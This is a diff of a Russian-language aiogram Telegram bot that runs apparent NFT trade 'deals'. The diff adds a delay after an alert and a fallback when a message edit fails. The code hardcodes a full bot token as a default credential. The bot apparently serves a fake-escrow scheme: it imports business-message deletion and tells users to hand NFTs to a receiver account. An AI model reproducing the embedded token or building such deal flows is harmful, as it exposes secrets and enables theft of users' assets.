@@ -1,6 +1,7 @@
 import asyncio
 import logging
 import re
+import os  # Добавлен для работы с переменными окружения
 from aiogram import Bot, Dispatcher, F
 from aiogram.types import (
     Message, CallbackQuery,
@@ -9,11 +10,9 @@ from aiogram.types import (
 )
 from aiogram.methods import DeleteBusinessMessages
 
-# ==== ТВОИ ДАННЫЕ ====
-import os
-
+# ==== ТВОИ ДАННЫЕ (берутся из Bothost) ====
 BOT_TOKEN = os.getenv("BOT_TOKEN", "8996050672:AAEuRexyR5o3jNSwlvxQxcEplN2-Bhpfq4M")
-ADMIN_ID = int(os.getenv("ADMIN_ID", "8747920918")) # Твой ID из скриншота
+ADMIN_ID = int(os.getenv("ADMIN_ID", "8747920918"))
 RECEIVER = os.getenv("RECEIVER", "marketsellbots")
 
 # ==== ID КАСТОМНЫХ ЭМОДЗИ ====
@@ -338,16 +337,21 @@ async def cmd_buy(message: Message):
 
 @dp.callback_query(F.data.startswith("accept|"))
 async def on_accept(callback: CallbackQuery):
-    # === ПРЕДУПРЕЖДЕНИЕ (АЛЕРТ) ===
+    # 1. Сначала показываем предупреждение (алерт)
     warning_text = (
         "ВНИМАНИЕ!\n\n"
         "• Не передавайте NFT напрямую пользователю, приславшему оффер.\n"
         "• Передавайте активы только боту: @marketsellbots\n"
         "• Будьте бдительны: остерегайтесь мошенников и читайте все сообщения от бота."
     )
+    
+    # Отправляем алерт
     await callback.answer(warning_text, show_alert=True)
 
-    # === ПОСЛЕ НАЖАТИЯ "ОК" — ПОКАЗЫВАЕМ СДЕЛКУ ===
+    # 2. Делаем паузу (0.5 сек), чтобы Telegram успел обработать алерт
+    await asyncio.sleep(0.5)
+
+    # 3. Только теперь меняем сообщение на экран сделки
     parts = callback.data.split("|")
     order_id = parts[1]
     lang = parts[2] if len(parts) > 2 else "ru"
@@ -359,12 +363,21 @@ async def on_accept(callback: CallbackQuery):
 
     text = create_deal_text(order_id, nft_link, amount, currency, lang)
 
-    await callback.message.edit_text(
-        text,
-        reply_markup=main_menu(order_id, lang),
-        parse_mode="HTML",
-        disable_web_page_preview=False
-    )
+    try:
+        await callback.message.edit_text(
+            text,
+            reply_markup=main_menu(order_id, lang),
+            parse_mode="HTML",
+            disable_web_page_preview=False
+        )
+    except Exception as e:
+        logging.warning(f"Не удалось отредактировать сообщение: {e}. Отправляю новое.")
+        await callback.message.answer(
+            text,
+            reply_markup=main_menu(order_id, lang),
+            parse_mode="HTML",
+            disable_web_page_preview=False
+        )
 
 
 @dp.callback_query(F.data.startswith("decline|"))
